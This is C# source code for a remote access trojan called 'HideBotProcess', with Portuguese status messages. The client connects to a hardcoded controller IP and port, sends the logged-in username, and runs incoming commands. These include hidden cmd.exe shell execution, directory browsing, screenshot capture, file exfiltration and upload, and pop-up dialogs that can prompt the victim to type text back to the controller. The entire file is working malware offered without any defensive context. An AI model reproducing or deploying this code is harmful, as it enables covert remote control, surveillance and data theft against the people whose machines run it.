using System;  
using System.IO;  
using System.Net;  
using System.Net.Sockets;  
using System.Text;  
using System.Drawing;
using System.Drawing.Imaging; 
using System.Runtime.InteropServices;
using System.Net.NetworkInformation;
using System.Globalization;
using System.Windows.Forms;
using System.Diagnostics;
  
public class HideBotProcess {  

    public static string MasterHostName = "192.168.43.195";
    public static int MasterSocketPort = 8080;
	    public static Socket MasterSocket = null;

    //Console.WriteLine("Echoed test = {0}", Encoding.ASCII.GetString(bytes,0,bytesRec));

    public static IPAddress FindMaster(){
        IPAddress MasterIp = null;
        while(true){
            try {
                IPHostEntry MasterHost = Dns.GetHostEntry(MasterHostName);
                MasterIp = MasterHost.AddressList[0];    
                return MasterIp;
            } catch (Exception) {
                Console.WriteLine("erro");
            }
        }
        
    }

    public static string cmd(string args){
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        startInfo.FileName = "cmd.exe";
        startInfo.Arguments = "/C "+args;
        startInfo.UseShellExecute = false;
        startInfo.RedirectStandardOutput = true;
        process.StartInfo = startInfo;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        return "["+output+"]";
    }

    public static string dir(string args){
        try{
            DirectoryInfo Dire = new DirectoryInfo(args);
            DirectoryInfo[] Directories = Dire.GetDirectories("*", SearchOption.TopDirectoryOnly);
            FileInfo[] Files = Dire.GetFiles("*", SearchOption.TopDirectoryOnly);
            string AllNames = "";
            int count = Files.Length + Directories.Length;
            Console.WriteLine(count);
            foreach(DirectoryInfo directory in Directories ){
            	count--;
                AllNames = AllNames + "\n"+(count==0?" ╚ ":" ╠ ")+ directory.Name + "\\";
            }
            foreach(FileInfo file in Files ){
            	count--;
                AllNames = AllNames + "\n"+(count==0?" └ ":" ├ ")+ file.Name;
            }
            return "["+Directory.GetCurrentDirectory()+"]"+AllNames+"";
        }catch (Exception){
            return "[Diretório Inexistente]";
        }
    }

    public static string scd(string args){
        try{
            Directory.SetCurrentDirectory(args);
            return "["+Directory.GetCurrentDirectory()+"]";
        }catch (Exception){
            return "[Diretório Inexistente]";
        }
    }

    public static string psc(string args){
        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Graphics graphics = Graphics.FromImage(bitmap as Image);
        graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
        string SavePath = Application.StartupPath+"\\"+args+".jpeg";
        bitmap.Save(SavePath, ImageFormat.Jpeg);
        return gfl(SavePath);
    }

    public static string gfl(string args){
        if (File.Exists(args)){
            using (FileStream file = File.OpenRead(args)){
                byte[] Size = new byte[2048];
                string Size_str = file.Length.ToString();
                while(Size_str.Length<2048){
                	Size_str += " ";
                }
                MasterSocket.Send(Encoding.UTF8.GetBytes(Size_str));
                Console.WriteLine(file.Length.ToString());
                byte[] Stream = new byte[2048];
                while (file.Read(Stream,0,Stream.Length) > 0){
                    MasterSocket.Send(Stream);
                }
                file.Close();
            }	
            return "[Download Concluído]";
        }else{	
            return "[Arquivo Inexistente]";
        }
    }

    public static string sfl(string args){
        using (FileStream file = File.OpenWrite(args)){
            MasterSocket.Send(Encoding.UTF8.GetBytes("[Upload Iniciado]"));
            byte[] Stream = new byte[2048];
            int bytesRec = MasterSocket.Receive(Stream);
            int Size = 0;
            if(Int32.TryParse(Encoding.UTF8.GetString(Stream,0,bytesRec),out Size)){
                if (Size==0) return "[Arquivo Inexistente]";
                while (Size > 0){
                    bytesRec = MasterSocket.Receive(Stream);
                    file.Write(Stream, 0, bytesRec);
                    Size = Size - bytesRec;
                }
            }else{
            	Console.WriteLine("erro---");
            }
            file.Close();
        }
        return "[Upload Concluído]";
    }

public static string msg(string args){
		System.Windows.Forms.MessageBoxButtons buttons = System.Windows.Forms.MessageBoxButtons.OK;
		if(args.Length>3){
			if(args.Substring(0,4).ToUpper()=="(YN)"){
				args = args.Substring(4);
				buttons = System.Windows.Forms.MessageBoxButtons.YesNo;
			}
		}
        return "["+MessageBox.Show(args,"Mensagem",buttons)+"]";
    }

    public static string ppt(string args){
		Form prompt = new Form()
        {
            Width = 400,
            Height = 130,
            FormBorderStyle = FormBorderStyle.FixedDialog,
            Text = "Mensagem",
            StartPosition = FormStartPosition.CenterScreen
        };
        Button confirmation = new Button() { Text = "Enviar", Left= 330 , Width=50, Top=63, DialogResult = DialogResult.OK };
        confirmation.Click += (sender, e) => { prompt.Close(); };
        prompt.Controls.Add(new TextBox() { Left = 15, Top=65, Width= 300, Font = new Font("Arial", 7)});
        prompt.Controls.Add(confirmation);
        prompt.Controls.Add(new Label() { Left = 10, Top=5, Text=args , Font = new Font("Arial", 15), Height = 60, Width = 380});
        prompt.AcceptButton = confirmation;
        prompt.ShowDialog();
        return "["+prompt.Controls[0].Text+"]";
    }

    public static string Interpreter (string command) {
    	Console.WriteLine(command);
        string args = command.Substring(4);
        switch(command.Substring(0,4)){
            case "cmd:": return cmd(args);
            case "dir:": return dir(args);
            case "scd:": return scd(args);
            case "psc:": return psc(args);
            case "gfl:": return gfl(args);
            case "sfl:": return sfl(args);
            case "msg:": return msg(args);
            case "ppt:": return ppt(args);
        }
        return "[Comando Inexistente]";
    }

    public static int Main(String[] args) {
        byte[] bytes = new byte[2048];
        while(true){
            try {
            	IPAddress MasterIp = FindMaster();
        		IPEndPoint MasterIpEndPoint = new IPEndPoint(MasterIp,MasterSocketPort);
                MasterSocket = new Socket(MasterIp.AddressFamily, SocketType.Stream, ProtocolType.Tcp );
                MasterSocket.Connect(MasterIpEndPoint);
                Console.WriteLine("connected...");
                MasterSocket.Send(Encoding.UTF8.GetBytes(Environment.UserName));
                while(true){
                    int bytesRec = MasterSocket.Receive(bytes);		
                    byte[] msg = Encoding.UTF8.GetBytes(Interpreter(Encoding.UTF8.GetString(bytes,0,bytesRec)));
                    Console.WriteLine(Encoding.UTF8.GetString(msg));
                    MasterSocket.Send(msg);
                }
            } catch (Exception) {
            	MasterSocket.Close();
                Console.WriteLine("[erro]");
            }
        }
        return 0;
    }  
}